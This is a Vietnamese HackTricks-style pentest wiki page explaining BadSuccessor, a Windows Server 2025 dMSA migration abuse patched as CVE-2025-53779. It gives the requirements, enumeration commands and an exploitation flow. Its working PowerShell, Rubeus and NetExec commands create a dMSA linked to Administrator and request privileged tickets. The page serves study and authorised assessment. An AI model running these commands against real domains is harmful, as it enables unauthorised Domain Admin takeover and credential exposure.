# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan

**BadSuccessor** khai thác quy trình di chuyển **delegated Managed Service Account** (**dMSA**) được giới thiệu trong **Windows Server 2025**. Một dMSA có thể được liên kết với tài khoản cũ thông qua **`msDS-ManagedAccountPrecededByLink`** và được chuyển qua các trạng thái di chuyển lưu trong **`msDS-DelegatedMSAState`**. Nếu kẻ tấn công có thể tạo dMSA trong một OU có quyền ghi và kiểm soát các thuộc tính đó, KDC có thể cấp ticket cho dMSA do kẻ tấn công kiểm soát với **ngữ cảnh ủy quyền của tài khoản được liên kết**.<sup>[[2]](#references)</sup>

Trên thực tế, điều này có nghĩa là người dùng có đặc quyền thấp chỉ có quyền OU được ủy quyền vẫn có thể tạo dMSA mới, trỏ nó đến `Administrator`, hoàn tất trạng thái di chuyển, rồi lấy TGT có PAC chứa các nhóm đặc quyền như **Domain Admins**.<sup>[[2]](#references)</sup>

## Chi tiết di chuyển dMSA cần lưu ý

- dMSA là tính năng của **Windows Server 2025**.
- `Start-ADServiceAccountMigration` đặt trạng thái di chuyển thành **đã bắt đầu**.
- `Complete-ADServiceAccountMigration` đặt trạng thái di chuyển thành **đã hoàn tất**.
- `msDS-DelegatedMSAState = 1` nghĩa là quá trình di chuyển đã bắt đầu.
- `msDS-DelegatedMSAState = 2` nghĩa là quá trình di chuyển đã hoàn tất.
- Trong quá trình di chuyển hợp lệ, dMSA được thiết kế để thay thế tài khoản cũ một cách minh bạch, vì vậy KDC/LSA duy trì quyền truy cập mà tài khoản trước đó đã có.<sup>[[3]](#references)</sup>

Microsoft Learn cũng lưu ý rằng trong quá trình di chuyển, tài khoản ban đầu được liên kết với dMSA và dMSA được thiết kế để truy cập những gì tài khoản cũ có thể truy cập.<sup>[[3]](#references)</sup> Đây là giả định bảo mật mà BadSuccessor khai thác.<sup>[[2]](#references)</sup>

## Yêu cầu

1. Một domain có **dMSA**, tức là AD hỗ trợ **Windows Server 2025**.
2. Kẻ tấn công có thể **tạo** các đối tượng `msDS-DelegatedManagedServiceAccount` trong một OU nào đó, hoặc có quyền tạo đối tượng con tương đương trên diện rộng tại đó.
3. Kẻ tấn công có thể **ghi** các thuộc tính dMSA liên quan hoặc toàn quyền kiểm soát dMSA mà họ vừa tạo.
4. Kẻ tấn công có thể yêu cầu Kerberos ticket từ ngữ cảnh đã tham gia domain hoặc qua tunnel kết nối được với LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Kiểm tra thực tế

Dấu hiệu rõ ràng nhất cho operator là xác minh cấp độ domain/forest và xác nhận môi trường đang sử dụng stack Server 2025 mới:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Nếu bạn thấy các giá trị như `Windows2025Domain` và `Windows2025Forest`, hãy ưu tiên kiểm tra **BadSuccessor / dMSA migration abuse**.

Bạn cũng có thể enumerate các OU có quyền ghi được ủy quyền để tạo dMSA bằng các công cụ công khai:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Luồng khai thác

1. Tạo một dMSA trong OU nơi bạn có quyền được ủy quyền tạo đối tượng con.
2. Đặt **`msDS-ManagedAccountPrecededByLink`** thành DN của mục tiêu có đặc quyền, chẳng hạn `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Đặt **`msDS-DelegatedMSAState`** thành `2` để đánh dấu quá trình di chuyển là đã hoàn tất.
4. Yêu cầu TGT cho dMSA mới và dùng ticket được trả về để truy cập các dịch vụ có đặc quyền.<sup>[[2]](#references)</sup>

Ví dụ PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ví dụ về yêu cầu ticket / công cụ vận hành:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Vì sao đây không chỉ là privilege escalation

Trong quá trình migration hợp lệ, Windows cũng cần dMSA mới xử lý các ticket được cấp cho account trước đó trước khi chuyển đổi. Vì vậy, dữ liệu ticket liên quan đến dMSA có thể bao gồm cả key **hiện tại** và **trước đó** trong luồng **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Khi kẻ tấn công kiểm soát một quá trình migration giả mạo, hành vi này có thể biến BadSuccessor thành:<sup>[[2]](#references)</sup>

- **Privilege escalation** bằng cách kế thừa các group SID có đặc quyền trong PAC.
- **Lộ dữ liệu thông tin xác thực** vì quá trình xử lý key trước đó có thể làm lộ dữ liệu tương đương với RC4/NT hash của account tiền nhiệm trong các workflow dễ bị tấn công.

Điều đó khiến kỹ thuật này hữu ích cho cả việc chiếm quyền kiểm soát domain trực tiếp và các hoạt động tiếp theo như pass-the-hash hoặc xâm phạm thông tin xác thực trên diện rộng hơn.

## Ghi chú về trạng thái bản vá

Hành vi BadSuccessor ban đầu **không chỉ là vấn đề lý thuyết trong bản preview năm 2025**. Microsoft đã gán mã **CVE-2025-53779** cho vấn đề này và phát hành bản cập nhật bảo mật vào **tháng 8 năm 2025**.<sup>[[4]](#references)</sup> Hãy lưu lại nội dung về cuộc tấn công này để dùng cho:

- **lab / CTF / bài tập assume-breach**
- **môi trường Windows Server 2025 chưa được vá**
- **kiểm tra quyền ủy quyền trên OU và mức độ phơi nhiễm dMSA trong quá trình đánh giá**

Đừng cho rằng domain Windows Server 2025 dễ bị tấn công chỉ vì có dMSA; hãy xác minh mức bản vá và kiểm tra cẩn thận.

## Công cụ

- [Công cụ BadSuccessor của Akamai](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Module `badsuccessor` của NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Lạm dụng dMSA qua BadSuccessor để đạt quyền Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Lạm dụng dMSA để nâng cao đặc quyền trong Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Tổng quan về Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../../banners/hacktricks-training.md}}
